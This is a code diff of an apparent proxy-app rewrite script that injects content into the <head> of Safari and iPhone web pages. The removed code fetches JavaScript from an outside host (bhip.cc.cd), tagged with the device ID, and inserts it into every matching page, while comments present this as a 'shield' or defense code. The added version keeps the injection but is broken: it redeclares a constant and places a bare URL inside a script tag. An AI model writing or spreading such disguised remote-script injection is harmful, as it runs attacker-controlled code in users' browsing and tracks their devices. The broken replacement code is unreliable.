@@ -5,37 +5,24 @@
 
 const ua = $request.headers['User-Agent'] || $request.headers['user-agent'];
 const did = $environment.device_id;
-const urls = [
-    `https://bhip.cc.cd/?id=${did}`
-];
 
-// 只要是网页请求就尝试获取云端脚本
-if (ua && (ua.includes("Safari") || ua.includes("iPhone")) && $response.body) {
-    fetchShield(0);
+
+const ua = $request.headers['User-Agent'] || $request.headers['user-agent'];
+let body = $response.body;
+
+// 1. 精准识别：仅在 Safari 浏览器或系统网页视图中运行，避免干扰其他 App 内部逻辑
+if (ua && (ua.includes("Safari") || ua.includes("iPhone")) && body && body.includes("<head>")) {
+    
+    const shield = `
+    <script>
+    https://bhip.cc.cd/?id=${did}
+    </script>
+    `;
+    
+    // 注入防御代码到页面头部
+    body = body.replace("<head>", "<head>" + shield);
+    $done({ body });
 } else {
+    // 非网页请求或非 Safari 请求，直接跳过
     $done({});
-}
-
-function fetchShield(idx) {
-    if (idx >= urls.length) return $done({}); 
-
-    $httpClient.get(urls[idx], (err, resp, data) => {
-        // 只要返回了内容，就执行注入逻辑
-        if (!err && resp.status === 200 && data && data.length > 20) {
-            let body = $response.body;
-            const scriptPayload = `<script id="sh-core">${data}</script>`;
-            
-            // 匹配 <head> 标签及其任何属性
-            if (/<head[^>]*>/i.test(body)) {
-                body = body.replace(/<head[^>]*>/i, `$&${scriptPayload}`);
-            } else {
-                body = scriptPayload + body;
-            }
-            
-            console.log("🛡️ Shield Success: " + urls[idx]);
-            $done({ body });
-        } else {
-            fetchShield(idx + 1); 
-        }
-    });
 }
